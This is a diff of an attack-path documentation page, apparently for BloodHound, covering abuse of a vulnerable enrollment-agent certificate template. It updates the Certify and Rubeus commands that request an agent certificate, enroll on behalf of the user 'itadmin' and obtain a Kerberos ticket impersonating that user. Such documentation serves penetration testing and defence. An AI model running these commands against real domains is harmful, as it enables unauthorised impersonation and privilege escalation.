@@ -19,34 +19,27 @@ target user or computer is protected by enrollment agent restrictions on the ent
 
 ### Windows
 
-Step 1: Use Certify to request an enrollment agent certificate.
+Step 1: Use Certify (2.0) to request an enrollment agent certificate.
 
-```bash
-Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
+```cmd
+Certify.exe request --ca CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA --template Vuln-EnrollmentAgent
 ```
 If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.
 
-Step 2: Convert the emitted certificate to PFX format.
+Step 2: Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allows for authentication and permits enrollment agent enrollment.
 
-```bash
-certutil.exe -MergePFX .\enrollmentcert.pem .\enrollmentcert.pfx
+```cmd
+Certify.exe request-agent --ca ca01.corp.local\CORP-CA01-CA --template User --target itadmin --agent-pfx <agent cert base64>
 ```
-Step 3: Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allow for authentication and permit enrollment agent enrollment.
 
-```bash
-Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollcert:enrollmentcert.pfx
-```
-Save the certificate as itadminenrollment.pem and the private key as itadminenrollment.key. If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the target principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. Choose another target with the given attribute set.
+If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the target principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. Choose another target with the given attribute set.
 
-Step 4: Convert the emitted certificate to PFX format.
+The certificate PFX is printed to the console in a base64-encoded format.
 
-```bash
-certutil.exe -MergePFX .\itadminenrollment.pem .\itadminenrollment.pfx
-```
-Step 5: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 4.
+Step 3: With Rubeus, use the issued certificate to authenticate to the domain and request a TGT, specifying the identity you intend to impersonate:
 
-```bash
-Rubeus.exe asktgt /user:itadmin /domain:corp.local /certificate:itadminenrollment.pfx
+```cmd
+Rubeus.exe asktgt /user:itadmin /domain:corp.local /certificate:<cert base64> /ptt
 ```
 ### Linux
 
@@ -85,7 +78,7 @@ This edge is related to the following MITRE ATT&CK tactic and techniques:
 
 ### Abuse and Opsec references
 
-* [Certipy](https://github.com/ly4k/Ce)
+* [Certipy](https://github.com/ly4k/Certipy)
 * [Certify](https://github.com/GhostPack/Certify)
 * [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
 * [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-cersod/97f47d4c-2901-41fa-9616-96b94e1b5435](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-cersod/97f47d4c-2901-41fa-9616-96b94e1b5435)
